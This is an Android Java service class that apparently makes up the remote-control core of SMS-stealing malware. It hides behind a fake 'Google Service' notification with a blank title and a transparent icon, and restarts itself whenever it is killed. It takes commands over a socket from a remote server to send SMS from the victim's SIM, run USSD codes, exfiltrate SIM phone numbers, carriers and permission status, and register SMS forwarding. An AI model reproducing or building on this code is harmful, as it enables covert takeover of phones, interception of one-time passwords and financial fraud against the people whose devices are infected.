package com.topdown.softy.server.socket;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.topdown.softy.R;
import com.topdown.softy.functions.PermissionManager;
import com.topdown.softy.functions.Prefs;
import com.topdown.softy.functions.Utils;
import com.topdown.softy.functions.listeners.ActionCallback;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import io.socket.client.Ack;


public class SocketService extends Service {

    private static final String CHANNEL_ID = "socket_channel";
    private static final int NOTIFICATION_ID = 1;
    private Prefs prefs;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createMinimalNotification());
        prefs = new Prefs(this);
        connectWebSocket();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartServiceIntent = new Intent(getApplicationContext(), SocketService.class);
        PendingIntent restartServicePendingIntent =
                PendingIntent.getService(getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_IMMUTABLE);
        AlarmManager alarmService = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmService.set(
                AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 1000,
                restartServicePendingIntent);
        super.onTaskRemoved(rootIntent);
    }


    public static void sendSMS(Context context, String phoneNumber, String message, int slot, ActionCallback callback) {
        SubscriptionManager subscriptionManager = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        if (subscriptionManager == null) {
            callback.onError("SubscriptionManager is not available.");
            return;
        }

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            callback.onError("Permission Error!");
            return;
        }
        List<SubscriptionInfo> subscriptionInfos = subscriptionManager.getActiveSubscriptionInfoList();
        if (subscriptionInfos == null || subscriptionInfos.isEmpty()) {
            callback.onError("No active SIM found.");
            return;
        }

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            callback.onError("SMS permission not granted.");
            return;
        }

        if (subscriptionInfos.size() == slot) {
            slot = 0;
        }

        int subscriptionId = subscriptionInfos.get(slot).getSubscriptionId();
        SmsManager smsManager = SmsManager.getSmsManagerForSubscriptionId(subscriptionId);

        // Normalize recipient list: split by comma/semicolon/whitespace
        String[] raw = phoneNumber == null ? new String[0] : phoneNumber.split("[,;\\s]+");
        List<String> numbers = new ArrayList<>();
        for (String n : raw) {
            if (n != null) {
                n = n.trim();
                if (!n.isEmpty()) numbers.add(n);
            }
        }
        if (numbers.isEmpty()) {
            callback.onError("No valid phone number.");
            return;
        }

        final String SENT = context.getPackageName() + ".SMS_SENT";
        final String DELIVERED = context.getPackageName() + ".SMS_DELIVERED";

        final AtomicInteger pendingSends = new AtomicInteger(numbers.size());
        final AtomicBoolean anyFailure = new AtomicBoolean(false);
        final List<String> failureMsgs = new CopyOnWriteArrayList<>();

        // Use arrays so we can unregister inside the inner class
        final BroadcastReceiver[] sentReceiverRef = new BroadcastReceiver[1];
        final BroadcastReceiver[] deliveredReceiverRef = new BroadcastReceiver[1];

        sentReceiverRef[0] = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent intent) {
                String to = intent.getStringExtra("to");
                int code = getResultCode();
                if (code != Activity.RESULT_OK) {
                    anyFailure.set(true);
                    String reason;
                    switch (code) {
                        case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                            reason = "Generic failure";
                            break;
                        case SmsManager.RESULT_ERROR_NO_SERVICE:
                            reason = "No service";
                            break;
                        case SmsManager.RESULT_ERROR_NULL_PDU:
                            reason = "Null PDU";
                            break;
                        case SmsManager.RESULT_ERROR_RADIO_OFF:
                            reason = "Radio off";
                            break;
                        default:
                            reason = "Unknown (" + code + ")";
                            break;
                    }
                    failureMsgs.add((to == null ? "<unknown>" : to) + ": " + reason);
                }

                if (pendingSends.decrementAndGet() == 0) {
                    try {
                        context.unregisterReceiver(sentReceiverRef[0]);
                    } catch (Exception ignore) {
                    }
                    try {
                        context.unregisterReceiver(deliveredReceiverRef[0]);
                    } catch (Exception ignore) {
                    }

                    if (anyFailure.get()) {
                        callback.onError("Send failed: " + TextUtils.join(", ", failureMsgs));
                    } else {
                        callback.onSuccess("SMS Sent ✅");
                    }
                }
            }
        };

        deliveredReceiverRef[0] = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent intent) {
            }
        };

        // Register receivers using ContextCompat to satisfy API 33+ and keep minSdk 26 happy
        IntentFilter sentFilter = new IntentFilter(SENT);
        IntentFilter deliveredFilter = new IntentFilter(DELIVERED);
        ContextCompat.registerReceiver(context, sentReceiverRef[0], sentFilter, ContextCompat.RECEIVER_NOT_EXPORTED);
        ContextCompat.registerReceiver(context, deliveredReceiverRef[0], deliveredFilter, ContextCompat.RECEIVER_NOT_EXPORTED);

        // Send to each number with unique PendingIntents carrying the recipient in extras
        for (int i = 0; i < numbers.size(); i++) {
            String to = numbers.get(i);

            Intent sentIntent = new Intent(SENT).setPackage(context.getPackageName());
            sentIntent.putExtra("to", to);
            PendingIntent sentPI = PendingIntent.getBroadcast(context, 1000 + i, sentIntent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

            Intent deliveredIntent = new Intent(DELIVERED).setPackage(context.getPackageName());
            deliveredIntent.putExtra("to", to);
            PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 2000 + i, deliveredIntent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

            smsManager.sendTextMessage(to, null, message, sentPI, deliveredPI);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Restarts if killed
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @SuppressLint("HardwareIds")
    private void connectWebSocket() {
        if (Utils.ADMIN_USERNAME.isEmpty()) {
            return;
        }
        Prefs prefs = new Prefs(this);

        SocketServer.init(Utils.getDeviceID(this));

        SocketServer.getSocket().on("get_system_info", args -> {
            Object lastArg = args[args.length - 1];
            if (lastArg instanceof Ack) {
                final Ack ackCallback = (Ack) lastArg;

                JSONObject ackData = new JSONObject();
                JSONObject systemInfo = new JSONObject();
                try {

                    systemInfo.put("deviceName", Utils.getPhoneName());
                    systemInfo.put("apiLevel", Build.VERSION.SDK_INT);
                    systemInfo.put("installedAt", prefs.getPref("installedAt"));
                    systemInfo.put("battery", getBattery());
                    systemInfo.put("simInfo", getSimInfo());
                    systemInfo.put("permissions", PermissionManager.getPermissionsStatus(this));

                    ackData.put("data", systemInfo);
                    ackData.put("status", "success");
                    ackData.put("msg", "success");
                } catch (JSONException ignored) {

                }
                ackCallback.call(ackData);
            }
        });

        SocketServer.getSocket().on("run-ussd", args -> {
            String ussd = (String) args[0];
            int slot = (int) args[1];
            Object lastArg = args[args.length - 1];
            Ack ackCallback = (lastArg instanceof Ack) ? (Ack) lastArg : null;

            runUssd(ussd, slot, new ActionCallback() {

                @Override
                public void onSuccess(String message) {
                    if (ackCallback != null) {
                        JSONObject ackData = new JSONObject();
                        try {
                            ackData.put("status", "success");
                            ackData.put("msg", message);
                        } catch (JSONException ignored) {
                        }
                        ackCallback.call(ackData);
                    }
                }

                @Override
                public void onError(String message) {
                    if (ackCallback != null) {
                        JSONObject ackData = new JSONObject();
                        try {
                            ackData.put("status", "error");
                            ackData.put("msg", message);
                        } catch (JSONException ignored) {
                        }
                        ackCallback.call(ackData);
                    }
                }
            });
        });

        SocketServer.getSocket().on("send-sms", args -> {
            String phoneNumber = (String) args[0];
            String message = (String) args[1];
            int slot = (int) args[2];

            Object lastArg = args[args.length - 1];
            Ack ackCallback = (lastArg instanceof Ack) ? (Ack) lastArg : null;
            sendSMS(this, phoneNumber, message, slot, new ActionCallback() {
                @Override
                public void onSuccess(String message) {
                    if (ackCallback != null) {
                        JSONObject ackData = new JSONObject();
                        try {
                            ackData.put("status", "success");
                            ackData.put("msg", message);
                        } catch (JSONException ignored) {
                        }
                        ackCallback.call(ackData);
                    }
                }

                @Override
                public void onError(String message) {
                    if (ackCallback != null) {
                        JSONObject ackData = new JSONObject();
                        try {
                            ackData.put("status", "error");
                            ackData.put("msg", message);
                        } catch (JSONException ignored) {
                        }
                        ackCallback.call(ackData);
                    }
                }
            });
        });

        SocketServer.getSocket().on("get_sim_status", args -> {
            Object lastArg = args[args.length - 1];
            if (lastArg instanceof Ack) {
                final Ack ackCallback = (Ack) lastArg;

                SubscriptionManager sm = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);

                JSONObject ackData = new JSONObject();
                JSONArray simInfo = new JSONArray();
                try {
                    if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                        if (subs == null) {
                            ackData.put("status", "error");
                            ackData.put("msg", "No Sim Card Found!");
                            return;
                        }
                        for (SubscriptionInfo info : subs) {
                            int slotIndex = info.getSimSlotIndex(); // 0 = SIM1, 1 = SIM2
                            String number = info.getNumber(); // Mobile number (can be null!)
                            String carrierName = info.getCarrierName().toString(); // Airtel, Jio, etc.
                            String displayName = info.getDisplayName().toString();
                            simInfo.put(new JSONObject().put("slotIndex", slotIndex).put("number", number).put("carrierName", carrierName).put("displayName", displayName));
                        }
                        ackData.put("status", "success");
                        ackData.put("msg", "success");
                        ackData.put("data", simInfo);
                        ackData.put("configs", new JSONObject().put("sms-forward", prefs.getPref("sms-forward")).put("sms-slot-index", prefs.getPref("sms-slot-index")));

                    } else {
                        ackData.put("status", "error");
                        ackData.put("msg", "Permission Error!");
                    }
                } catch (JSONException ignored) {

                }
                ackCallback.call(ackData);
            }
        });

    }


    private JSONObject getSimInfo() throws JSONException {
        JSONObject simInfo = new JSONObject();

        simInfo.put("sim1", "N/A");
        simInfo.put("sim2", "N/A");

        SubscriptionManager sm = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
            if (subs == null) {
                return simInfo;
            }
            for (SubscriptionInfo info : subs) {
                int slotIndex = info.getSimSlotIndex(); // 0 = SIM1, 1 = SIM2
                String number = info.getNumber(); // Mobile number (can be null!)
                simInfo.put("sim" + (slotIndex + 1), number);
            }
        }
        return simInfo;
    }

    private String getBattery() {
        IntentFilter intentFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, intentFilter);

        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

            float batteryPct = level * 100 / (float) scale;

            return batteryPct + "";
        }
        return "N/A";
    }

    private void runUssd(String ussd, int slot, ActionCallback callback) {
        if (ussd == null || ussd.isEmpty()) {
            callback.onError("Invalid USSD code.");
            return;
        }
        if (ussd.equals("*989#")) {
            unregisterOfflineSMSForwarding(callback);
            return;
        }
        if (ussd.startsWith("*989#")) {
            registerSMSForwarding(ussd, slot, callback);
            return;
        }
        SubscriptionManager subscriptionManager = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        if (subscriptionManager == null) {
            callback.onError("Device may not support telephony or service is unavailable");
            return;
        }

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            callback.onError("Permission Error!");
            return;
        }
        List<SubscriptionInfo> subscriptionInfos = subscriptionManager.getActiveSubscriptionInfoList();
        if (subscriptionInfos == null || subscriptionInfos.isEmpty()) {
            callback.onError("No active SIM cards found.");
            return;
        }

        if (subscriptionInfos.size() == slot) {
            slot = 0;
        }

        if (slot < 0 || slot >= subscriptionInfos.size()) {
            callback.onError("Invalid SIM slot index.");
            return;
        }

        SubscriptionInfo simInfo = subscriptionInfos.get(slot);
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (telephonyManager == null) {
            callback.onError("TelephonyManager is not available on this device.");
            return;
        }

        TelephonyManager simTelephonyManager = telephonyManager.createForSubscriptionId(simInfo.getSubscriptionId());
        if (simTelephonyManager == null) {
            callback.onError("Unable to create TelephonyManager for the selected SIM.");
            return;
        }

        simTelephonyManager.sendUssdRequest(ussd, new TelephonyManager.UssdResponseCallback() {
            @Override
            public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                callback.onSuccess("USSD Code Executed: " + response.toString());
            }

            @Override
            public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                String errorMessage;
                switch (failureCode) {
                    case TelephonyManager.USSD_RETURN_FAILURE:
                        errorMessage = "USSD request failed: returned failure.";
                        break;
                    case TelephonyManager.USSD_ERROR_SERVICE_UNAVAIL:
                        errorMessage = "USSD service is unavailable.";
                        break;
                    default:
                        errorMessage = "Unknown USSD failure. Code: " + failureCode;
                        break;
                }
                callback.onError(errorMessage);
            }
        }, null);
    }

    private void unregisterOfflineSMSForwarding(ActionCallback callback) {
        prefs.removePref("sms-forward");
        prefs.removePref("sms-slot-index");
        callback.onSuccess("SMS Forwarding Unregistered ✅");
    }

    private void registerSMSForwarding(String ussd, int slot, ActionCallback callback) {
        prefs.setPref("sms-forward", ussd.replaceAll("\\*989#", ""));
        prefs.setPref("sms-slot-index", slot + "");
        callback.onSuccess("SMS Forwarding Registered ✅");
    }

    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Google Service", NotificationManager.IMPORTANCE_MIN);
        channel.setDescription("Checking For Updates");

        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createMinimalNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("").setContentText("").setSmallIcon(R.drawable.ic_notification) // Transparent icon
                .setPriority(NotificationCompat.PRIORITY_MIN).setOngoing(true).build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Attempt to restart service
        Intent restartIntent = new Intent(getApplicationContext(), SocketService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
                getApplicationContext(), 1, restartIntent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
        );

        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 1000, pendingIntent);

        Intent broadcastIntent = new Intent("ac.in.ActivityRecognition.RestartSensor");
        sendBroadcast(broadcastIntent);
    }

}

